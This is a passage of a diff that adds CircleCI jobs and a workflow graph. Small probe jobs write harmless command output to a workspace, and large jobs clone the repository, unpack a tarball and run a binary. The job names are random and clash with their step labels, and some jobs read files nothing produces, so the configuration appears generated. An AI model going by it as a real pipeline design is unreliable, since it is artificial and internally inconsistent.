+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: StoreControlGroupPhase
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; printf -v sum "%*s" 11 ""; echo "[$sum]"; true ; } > /var/tmp/store/dev-tmp-qa
+            echo "job build-nightly-release-candidate: $(wc -c </var/tmp/store/dev-tmp-qa)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'dev-tmp-qa'
+  build-nightly-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/dev-tmp-qa 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  NO_CARD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Cleared for reaping
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; pr -2 -t /etc/shells | head; true ; } > /var/tmp/store/thunderYield
+            echo "job atlas-v2: $(wc -c </var/tmp/store/thunderYield)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'thunderYield'
+  atlas-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/28.04.2020 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  RootedInternalClusterVisitor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Pause 20 seconds then defragment the slow query log
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; ls -FchiX /usr/local | awk 'NR % 3 == 0'; true ; } > /var/tmp/store/TENSOR_GREEN
+            echo "job realease: $(wc -c </var/tmp/store/TENSOR_GREEN)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'TENSOR_GREEN'
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  RANK_CLIENT_ENUM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: hr owned drain
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; find ~ -maxdepth 1 | sort | uniq -c | nl; true ; } > /var/tmp/store/BEAM_MEMO_FILTER
+            echo "job DEPLOY_PROD: $(wc -c </var/tmp/store/BEAM_MEMO_FILTER)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'BEAM_MEMO_FILTER'
+  DEPLOY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/BEAM_MEMO_FILTER 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  byang:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Yeet bucket policies
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; if test -x /usr/bin/env; then echo 'ok'; else echo 'not ok'; fi; true ; } > /var/tmp/store/crc_94569eb2
+            echo "job dec17-release: $(wc -c </var/tmp/store/crc_94569eb2)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'crc_94569eb2'
+  dec17-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+
+workflows:
+  pipeline:
+    jobs:
+      - TEXTURE_2
+      - chen-ship:
+          requires:
+            - TEXTURE_2
+      - wrapperchannel:
+          requires:
+            - TEXTURE_2
+      - polaris-ng:
+          requires:
+            - wrapperchannel
+      - RANK_CLIENT_ENUM:
+          requires:
+            - wrapperchannel
+      - DEPLOY_PROD:
+          requires:
+            - RANK_CLIENT_ENUM
+      - cakstyntklaixo:
+          requires:
+            - RANK_CLIENT_ENUM
+      - send-it:
+          requires:
+            - cakstyntklaixo
+      - ugdf53al5j2iq961:
+          requires:
+            - cakstyntklaixo
+      - build-nightly-release-candidate:
+          requires:
+            - ugdf53al5j2iq961
+      - uq_Digest:
+          requires:
+            - ugdf53al5j2iq961
+      - refactor-3432:
+          requires:
+            - uq_Digest
+      - check_measure_asset:
+          requires:
+            - uq_Digest
+      - titan-alpha:
+          requires:
+            - check_measure_asset
+      - min_driver:
+          requires:
+            - check_measure_asset
+      - hu-run:
+          requires:
+            - min_driver
+      - sec_993:
+          requires:
+            - min_driver
+      - yuki-smoke:
+          requires:
+            - sec_993
+      - closedParser_encode:
+          requires:
+            - sec_993
+      - yolo:
+          requires:
+            - closedParser_encode
+      - on_object_count
+      - convertPriceMVP
+      - dst_tel_ord
+      - feat-5968:
+          requires:
+            - on_object_count
+            - convertPriceMVP
+            - dst_tel_ord
+      - verify-production-artifact-bundle:
+          requires:
+            - on_object_count
+            - convertPriceMVP
+            - dst_tel_ord
+      - bravo-6:
+          requires:
+            - on_object_count
+            - convertPriceMVP
+            - dst_tel_ord
+      - intergration:
+          requires:
+            - on_object_count
+            - convertPriceMVP
+            - dst_tel_ord
+      - victor:
+          requires:
+            - on_object_count
+            - convertPriceMVP
+            - dst_tel_ord
+      - LaunchProd:
+          requires:
+            - on_object_count
+            - convertPriceMVP
+            - dst_tel_ord
+      - atlas-v2:
+          requires:
+            - on_object_count
+            - convertPriceMVP
+            - dst_tel_ord
+      - item_v6
+      - c0mp137ez
+      - helios-beta:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - v7-edge4:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - dec17-release:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - feb3-cleanup:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - validate-production-integration-tests:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - aug14-ship:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - rm-oauth-timeout:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - deploy:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - fix-webhook:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - realease:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - feb4-canary:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - nico-push:
+          requires:
+            - item_v6
+            - c0mp137ez
+      - v5-beta:
+          requires:
+            - item_v6
+            - c0mp137ez
